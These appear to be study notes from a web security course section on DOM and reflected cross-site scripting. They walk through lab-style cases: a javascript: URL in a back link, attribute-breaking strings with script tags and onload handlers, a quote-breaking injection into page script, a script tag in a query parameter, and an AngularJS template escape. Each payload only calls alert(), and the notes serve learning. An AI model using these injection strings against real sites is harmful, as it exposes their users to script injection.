# Section 10: DOM XSS Vulnerabilities

## Discovering a Reflected DOM XSS in a Link

Example: The return path on a back link is populated from a query parameter in the Link

```
<a id="backLink" href="zaidzaid">Back</a>
```

Can run JavaScript within href:

`feeback?returnPath=javascript:alert(3)`

```
<a id="backLink" href="javascript:alert(3)">Back</a>
```

---

## Discoverting a Reflected XSS in an Image Tag

Example: Typing in a search box, the content is being displayed in `img` `src`, as part of the image path

Type a single quote to close `src="` quote:

Search Term:
```
"><script>alert(1)</script>//
```

or with less tags:

```
" onload=alert(3)
```

---

## Injecting JavaScript Directly in a Page Script

Example: A search term is used in a JS function

```
var seartchTerms = 'test';
document.write('<img src="/resources/images"tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

JS code can be injected into the page via the textarea search:

```
';alert(22);//
```

single quotes closed and comments added at the end

---


## Discovering XSS in a Drop-down menu

Example: modyfing URL query params for an async search function

```
.net/productId=3&storeId=Milanaaa<script>alert(22)</script>
```

---

## Discovering XSS in AngularyJS Application

Gathering information about technology used in Wappalyzer tool
- Find out AngularJS framework is uded
- Google for: angualar js xss cheatsheet
- Found that there is a way to run JS in AngularJS: `{{constructor.constructor('alert(1)')()}}`
- JS code is injected

---


